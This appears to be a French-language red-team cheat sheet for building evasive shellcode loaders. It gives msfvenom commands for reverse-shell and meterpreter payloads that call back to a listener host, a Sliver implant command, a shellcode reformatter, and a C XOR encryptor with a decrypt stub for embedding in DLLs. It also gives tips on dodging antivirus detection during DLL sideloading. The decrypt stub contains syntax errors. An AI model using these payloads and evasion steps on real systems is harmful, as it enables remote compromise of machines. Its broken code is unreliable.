
> [!Warning]
> Marche bien pour le DLL sideloading.
> Nécessite d'obfusquer l'IAT (Table d'imports) en complément dans les PE.


- [[#Generate Shellcode]]
- [[#Format Shellcode]]
- [[#XOR Encryptor]]



# Generate Shellcode

- [[#Metasploit]]
- [[#Sliver]]


## Metasploit

reverse shell classique (fonctionne bien)

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.1.26 LPORT=443 EXITFUNC=thread -f c
```

reverse shell classique directement chiffré en XOR (fonctionne bien)

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.1.26 LPORT=443 EXITFUNC=thread --encrypt xor --encryption-key "Kaboom" -f c
```

meterpreter (Peut bloquer à l'envoi du stage ?)

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.26 LPORT=443 EXITFUNC=thread -f c
```

meterpreter chiffré en XOR (Peut bloquer à l'envoi du stage ?)

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.26 LPORT=443 EXITFUNC=thread --encrypt xor --encryption-key "Kaboom" -f c
```


## Sliver

```
generate --mtls pm01.puppet.vl --os windows --arch amd64 --format shellcode -e -N nom_implant
```


---
# Format Shellcode

Script python permettant de reformatter le shellcode en plusieurs lignes si besoin

format_shellcode.py

```python
def reformat_shellcode(one_line: str, bytes_per_line: int = 16, lang: str = "c"):
    """
    one_line: shellcode en une ligne, exemple: "\\x31\\xc0\\x50..."
    bytes_per_line: nombre d'octets par ligne (ex: 16)
    lang: "c", "python", ou "js" pour formater la sortie
    """
    s = one_line.strip()
    # retire les guillemets entourant si elles existent
    if (s.startswith('"') and s.endswith('"')) or (s.startswith("'") and s.endswith("'")):
        s = s[1:-1]
    # normalise les backslashes doubles si présents (optionnel)
    s = s.replace('\\\\x', '\\x')

    # valider la forme (séquences \xNN)
    import re
    bytes_seq = re.findall(r'\\x[0-9A-Fa-f]{2}', s)
    if not bytes_seq:
        raise ValueError("Aucune séquence \\xHH trouvée dans l'entrée.")

    # reconstitue une chaîne sans espaces, puis découpe
    joined = ''.join(bytes_seq)  # ex: \x31\xc0...
    chunk_len = bytes_per_line * 4  # 4 caractères par \xHH
    chunks = [joined[i:i+chunk_len] for i in range(0, len(joined), chunk_len)]

    if lang == "c":
        lines = ['"' + ch + '"' for ch in chunks]
        body = '\n'.join(lines)
        result = 'char shellcode[] =\n' + body + ';'
    elif lang == "python":
        lines = ['b"' + ch + '"' for ch in chunks]
        body = '\n'.join('    ' + l for l in lines)
        result = 'shellcode = (\n' + body + '\n)'
    elif lang == "js":
        lines = ['"' + ch + '"' for ch in chunks]
        body = ' +\n'.join('  ' + l for l in lines)
        result = 'const shell = (\n' + body + '\n);'
    else:
        # simple: juste guillemets ligne par ligne
        result = '\n'.join('"' + ch + '"' for ch in chunks)

    return result


one_line = r"<SHELLCODE>"
print(reformat_shellcode(one_line, bytes_per_line=16, lang="c"))
```

---
# XOR Encryptor

> [!Warning]
> Eviter d'utiliser des clés avec un seul octet, trop facile à detecter

Programme en C

XOR.c

```c
#include <stdio.h>
#include <stdlib.h>

/* La fonction XOR permet de chiffrer et dechiffrer.*/

void XOR(unsigned char code[], int code_len)
{
    unsigned char key[] = "SuperKeyGigaCrazyofofodod";   // clé de chiffrement multi-caractères

    int key_len = sizeof(key) - 1; // On récupère la taille de la clé (enlever le \0 final)
    
    printf("size of code : %d \n", code_len);
    printf("size of key : %d \n\n", key_len);

    for (int i = 0; i < code_len; i++)
    {  
        unsigned char k = key[i % key_len];  // répète la clé
        code[i] = code[i] ^ k; // On XOR le code avec la clé
    }
}

int main()
{
    unsigned char code[] = "..."; // Shellcode a XORer
    
    int code_len = sizeof(code) - 1; // On récupère la taille du shellcode (enlever le \0 final)

    XOR(code, code_len); // on appelle la fonction XOR

    // On affiche le shellcode XORé
    printf("XORed shellcode :\n\n");
    for (int i = 0; i < code_len; i++)
    {
        printf("\\x%02x", code[i]);
    }

    return 0;
}
```

Decrypt fonction to past and call in our dll / exe

```c
void XOR(unsigned char code[], int code_len)
{
	char key[] = "SuperKeyGigaCrazyofofodod";
	    for (int i = 0; i < code_len; i++) // -1 pour ignorer le '\0'
    {  
        unsigned char k = key[i % key_len];       // répète la clé
        code[i] = code[i] ^ k); // XOR du code
    }
	return 0;
}

int main()
{
	unsigned char code[] = "..."; //Shellcode a dechiffrer
	int code_len = sizeof(code) - 1;
	...
	XOR(code, code_len);
	...
}
```